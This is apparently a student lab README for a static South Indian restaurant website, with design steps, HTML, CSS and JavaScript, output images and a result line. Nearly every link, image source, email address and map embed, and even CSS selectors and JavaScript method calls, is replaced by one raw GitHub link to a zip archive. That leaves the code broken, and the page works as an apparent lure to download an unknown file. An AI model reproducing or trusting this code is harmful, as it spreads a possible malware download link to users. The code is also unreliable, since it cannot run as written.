# Ex.07 Restaurant Website
## Date: 08.10.2025

## AIM:
To develop a static Restaurant website to display the food items and services provided by them.

## DESIGN STEPS:

### Step 1:
Requirement collection.

### Step 2:
Creating the layout using HTML and CSS.

### Step 3:
Updating the sample content.

### Step 4:
Choose the appropriate style and color scheme.

### Step 5:
Validate the layout in various browsers.

### Step 6:
Validate the HTML code.

### Step 7:
Publish the website in the given URL.

## PROGRAM:
~~~
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aditya Jorim Restaurant</title>
    <!-- Google Fonts for typography -->
    <link rel="preconnect" href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip">
    <link rel="preconnect" href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" crossorigin>
    <link href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip+Text:wght@400;500;700&family=Karla:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* --------------------
        CSS Variables - Color Scheme & Fonts
        --------------------
        */
        :root {
            --primary-color: #495E57;
            --secondary-color: #F4CE14;
            --background-color: #EDEFEE;
            --accent-color: #e0e0e0;
            --text-color: #333333;
            --header-font: 'Markazi Text', serif;
            --body-font: 'Karla', sans-serif;
        }

        /* --------------------
        General Body & Reset Styles
        --------------------
        */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: var(--body-font);
            background-color: var(--background-color);
            color: var(--text-color);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* --------------------
        Header & Navigation
        --------------------
        */
        .site-header {
            background-color: white;
            padding: 10px 0;
            border-bottom: 1px solid var(--accent-color);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: var(--primary-color);
        }

        .logo-icon {
            font-size: 2.5rem;
        }
        
        .logo-text {
            font-family: var(--header-font);
            font-size: 2.5rem;
            font-weight: 700;
        }

        .main-nav ul {
            list-style-type: none;
            display: flex;
            gap: 20px;
        }

        .main-nav a {
            text-decoration: none;
            color: var(--primary-color);
            font-weight: 700;
            font-size: 1.1rem;
            padding: 10px 15px;
            border-radius: 8px;
            transition: background-color 0.3s, color 0.3s;
        }

        .main-nav a:hover,
        .main-nav https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip {
            background-color: var(--primary-color);
            color: white;
        }
        
        /* --------------------
        Page Section Management
        --------------------
        */
        .page-section {
            display: none; /* All sections are hidden by default */
            animation: fadeIn 0.5s ease-in-out;
        }
        
        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip {
            display: block; /* The active section is displayed */
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* --------------------
        Home Page Styles
        --------------------
        */
        .hero-banner {
            background-image: url('https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip');
            background-size: cover;
            background-position: center;
            color: white;
            padding: 60px 40px;
            border-radius: 16px;
            margin-top: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
        }
        
        .hero-banner h1 {
            font-family: var(--header-font);
            font-size: 3.5rem;
            margin-bottom: 10px;
        }

        .hero-banner p {
            font-size: 1.2rem;
            max-width: 60%;
        }

        .home-content-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 30px;
            margin-top: 30px;
        }

        .info-card {
            background-color: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            display: flex;
            flex-direction: column;
        }

        .info-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .info-card-content {
            padding: 20px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }
        
        .info-card h2 {
            font-family: var(--header-font);
            font-size: 2rem;
            color: var(--primary-color);
            margin-bottom: 15px;
        }

        .info-card p {
            line-height: 1.6;
            flex-grow: 1;
            margin-bottom: 15px;
        }
        
        .info-card-content ul {
            list-style: none;
            padding: 0;
            line-height: 1.8;
            font-weight: 500;
        }

        .info-card a {
            color: var(--primary-color);
            font-weight: 700;
            text-decoration: none;
            transition: color 0.3s;
        }

        .info-card a:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }
        
        /* --------------------
        Menu & Administration Page Styles (Grid Layout)
        --------------------
        */
        .page-header {
            text-align: center;
            margin: 40px 0;
            font-family: var(--header-font);
            font-size: 3rem;
            color: var(--primary-color);
        }

        .menu-grid, .admin-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .menu-item, .admin-card {
            background-color: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .menu-item:hover, .admin-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
        }

        .menu-item img, .admin-card img {
            width: 100%;
            height: 220px; /* You can adjust this value for the chef images */
            object-fit: cover;
            object-position: center top; 
        }
        
        .menu-item-content, .admin-card-content {
            padding: 20px;
        }
        
        .menu-item-header {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            margin-bottom: 10px;
        }

        .menu-item-header h3 {
            font-family: var(--header-font);
            font-size: 1.8rem;
            color: var(--primary-color);
        }

        .menu-item-header .price {
            font-weight: 700;
            color: var(--secondary-color);
            font-size: 1.2rem;
        }
        
        .admin-card-content h3 {
            font-family: var(--header-font);
            font-size: 1.8rem;
            color: var(--primary-color);
            text-align: center;
        }
        
        .admin-card-content .designation {
            text-align: center;
            color: #666;
            font-style: italic;
            margin-top: 5px;
        }

        /* --------------------
        Contact Page Styles
        --------------------
        */
        .contact-content {
            background-color: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 40px;
            align-items: center;
        }

        .contact-info h3 {
            font-family: var(--header-font);
            font-size: 2.2rem;
            color: var(--primary-color);
            margin-bottom: 20px;
        }
        
        .contact-info p {
            font-size: 1.1rem;
            line-height: 2;
        }
        
        .contact-info strong {
            color: var(--primary-color);
        }
        
        /* --------------------
        Footer
        --------------------
        */
        /* The footer section has been removed as requested. */
        
        /* --------------------
        Responsive Design
        --------------------
        */
        @media (max-width: 992px) {
            .home-content-grid {
                grid-template-columns: 1fr 1fr;
            }
            .contact-content {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 15px;
            }
            .main-nav ul {
                flex-wrap: wrap;
                justify-content: center;
                gap: 10px;
            }
            .hero-banner {
                padding: 40px 20px;
                text-align: center;
            }
            .hero-banner p {
                max-width: 100%;
            }
            .home-content-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>

    <!-- Header Section -->
    <header class="site-header">
        <div class="container header-content">
            <a href="#" class="logo">
                <span class="logo-icon">⭐</span>
                <span class="logo-text">Aditya Jorim</span>
            </a>
            <nav class="main-nav">
                <ul>
                    <li><a href="#home" class="nav-link active">Home</a></li>
                    <li><a href="#menu" class="nav-link">Menu</a></li>
                    <li><a href="#administration" class="nav-link">Administration</a></li>
                    <li><a href="#contact" class="nav-link">Contact Us</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <main>
        <!-- Home Page Section -->
        <section id="home" class="page-section active">
            <div class="container">
                <div class="hero-banner">
                    <h1>30% Off This Weekend</h1>
                    <p>Experience the authentic taste of South India. Freshly prepared, traditionally spiced.</p>
                </div>
                <div class="home-content-grid">
                    <article class="info-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="A colorful salad bowl">
                        <div class="info-card-content">
                            <h2>Our New Menu</h2>
                            <p>Discover a rich tapestry of flavors with our new menu, featuring beloved classics and exciting new creations from across South India. Every dish is a celebration of tradition.</p>
                            <a href="#menu" class="nav-link-internal">See our new menu</a>
                        </div>
                    </article>
                    <article class="info-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="A restaurant interior">
                        <div class="info-card-content">
                            <h2>Book a table</h2>
                            <p>Reserve your table to guarantee a spot. We welcome you to join us for a memorable dining experience, perfect for any occasion from family dinners to special celebrations.</p>
                            <a href="#">Book your table now</a>
                        </div>
                    </article>
                    <article class="info-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Chef preparing food in a kitchen">
                        <div class="info-card-content">
                            <h2>Opening Hours</h2>
                            <ul>
                                <li>Mon - Fri: 2pm - 10pm</li>
                                <li>Sat: 2pm - 11pm</li>
                                <li>Sun: 2pm - 9pm</li>
                            </ul>
                        </div>
                    </article>
                </div>
            </div>
        </section>

        <!-- Menu Page Section -->
        <section id="menu" class="page-section">
            <div class="container">
                <h1 class="page-header">Our South Indian Menu</h1>
                <div class="menu-grid">
                    <!-- 12 Menu Items -->
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Masala Dosa">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Masala Dosa</h3><span class="price">₹250</span></div>
                            <p class="description">Crispy rice crepe filled with spiced potatoes, served with sambar & chutney.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Idli with Sambar">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Idli with Sambar</h3><span class="price">₹180</span></div>
                            <p class="description">Steamed fluffy rice cakes served with a hot lentil-based vegetable stew.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Hyderabadi Biryani">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Chicken Biryani</h3><span class="price">₹450</span></div>
                            <p class="description">Aromatic rice and tender chicken, slow-cooked with saffron and spices.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Chettinad Pepper Chicken">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Pepper Chicken</h3><span class="price">₹420</span></div>
                            <p class="description">A fiery and aromatic curry known for its bold flavors of black pepper.</p>
                        </div>
                    </article>
                     <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Medu Vada">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Medu Vada</h3><span class="price">₹150</span></div>
                            <p class="description">Savory, crispy fritter that is soft on the inside, perfect for dipping in sambar.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Ven Pongal">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Ven Pongal</h3><span class="price">₹200</span></div>
                            <p class="description">Comforting rice and yellow moong dal, flavored with pepper, cumin, and ghee.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Appam with Stew">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Appam with Stew</h3><span class="price">₹280</span></div>
                            <p class="description">Soft, lacy rice pancakes paired with a creamy coconut milk-based vegetable stew.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip%3A%2F%2F127.0.0.1%2Fktadmin%2Fimg%2Fpages%2Fmobile%https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Puttu and Kadala Curry">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Puttu & Kadala</h3><span class="price">₹260</span></div>
                            <p class="description">Steamed rice cylinders with coconut, served with a spicy black chickpea curry.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Fish Molee">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Fish Molee</h3><span class="price">₹550</span></div>
                            <p class="description">Mild and creamy Kerala-style fish curry simmered in coconut milk gravy.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Bisi Bele Bath">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Bisi Bele Bath</h3><span class="price">₹240</span></div>
                            <p class="description">A traditional one-pot meal of rice, lentils, and vegetables with aromatic spices.</p>
                        </div>
                    </article>
                     <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Lemon Rice">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Lemon Rice</h3><span class="price">₹190</span></div>
                            <p class="description">A tangy rice dish tempered with mustard seeds, lentils, peanuts, and curry leaves.</p>
                        </div>
                    </article>
                    <article class="menu-item">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Mysore Pak">
                        <div class="menu-item-content">
                            <div class="menu-item-header"><h3 class="name">Mysore Pak</h3><span class="price">₹150</span></div>
                            <p class="description">A rich, traditional sweet made from gram flour, generous amounts of ghee, and sugar.</p>
                        </div>
                    </article>
                </div>
            </div>
        </section>

        <!-- Administration Page Section -->
        <section id="administration" class="page-section">
            <div class="container">
                <h1 class="page-header">Our Team</h1>
                <div class="admin-grid">
                    <!-- 6 Team Members -->
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip():max_bytes(150000):strip_icc()https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head Chef">
                        <div class="admin-card-content">
                            <h3>Walter White</h3>
                            <p class="designation">Head Chef & Founder</p>
                        </div>
                    </article>
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Restaurant Manager">
                        <div class="admin-card-content">
                            <h3>Gus Fring</h3>
                            <p class="designation">Restaurant Manager</p>
                        </div>
                    </article>
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Sous Chef">
                        <div class="admin-card-content">
                            <h3>Jesse Pinkman</h3>
                            <p class="designation">Sous Chef</p>
                        </div>
                    </article>
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head of Logistics">
                        <div class="admin-card-content">
                            <h3>Lydia Rodarte-Quayle</h3>
                            <p class="designation">Head of Logistics</p>
                        </div>
                    </article>
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip*https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Legal Counsel">
                        <div class="admin-card-content">
                            <h3>Saul Goodman</h3>
                            <p class="designation">Legal Counsel</p>
                        </div>
                    </article>
                    <article class="admin-card">
                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head of Security">
                        <div class="admin-card-content">
                            <h3>Mike Ehrmantraut</h3>
                            <p class="designation">Head of Security</p>
                        </div>
                    </article>
                </div>
            </div>
        </section>

        <!-- Contact Us Page Section -->
        <section id="contact" class="page-section">
            <div class="container">
                <h1 class="page-header">Contact Us</h1>
                <div class="contact-content">
                    <div class="contact-info">
                        <h3>Get In Touch</h3>
                        <p><strong>Address:</strong><br>123 Lemon Grove, T. Nagar, Chennai, 600017</p>
                        <p><strong>Phone:</strong><br><a href="tel:+1234567890">(123) 456-7890</a></p>
                        <p><strong>Email:</strong><br><a href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip">https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip</a></p>
                    </div>
                    <div class="contact-map">
                        <iframe src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip!1m18!1m12!1m3!1d15545.96131336423!2d80.2291986429215!3d13.036989392330857!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a526654215f5c1b%3A0x6e664268393557d0!2sT.+Nagar%2C+Chennai%2C+Tamil+Nadu!5e0!3m2!1sen!2sin!4v1678297609251!5m2!1sen!2sin" width="100%" height="300" style="border:0; border-radius: 12px;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- The footer section that was here has been removed. -->

    <script>
        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('DOMContentLoaded', function() {
            const navLinks = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.main-nav a');
            const internalLinks = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.nav-link-internal');
            const pageSections = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.page-section');

            // Function to switch pages
            function showPage(pageId) {
                // Hide all sections
                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(section => {
                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                });

                // Show the target section
                const targetSection = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(pageId);
                if (targetSection) {
                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                }

                // Update active state in navigation
                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                    if (https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href') === `#${pageId}`) {
                        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                    }
                });
                
                // Scroll to top of the page on navigation
                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(0, 0);
            }

            // Event listener for main navigation
            https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('click', function(event) {
                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip();
                    const pageId = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href').substring(1);
                    showPage(pageId);
                });
            });

            // Event listener for internal links (like "See our menu")
            https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('click', function(event) {
                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip();
                    const pageId = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href').substring(1);
                    showPage(pageId);
                });
            });
        });
    </script>
</body>
</html>


~~~

## OUTPUT:

![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)

## RESULT:
The program for designing software company website using HTML and CSS is completed successfully.
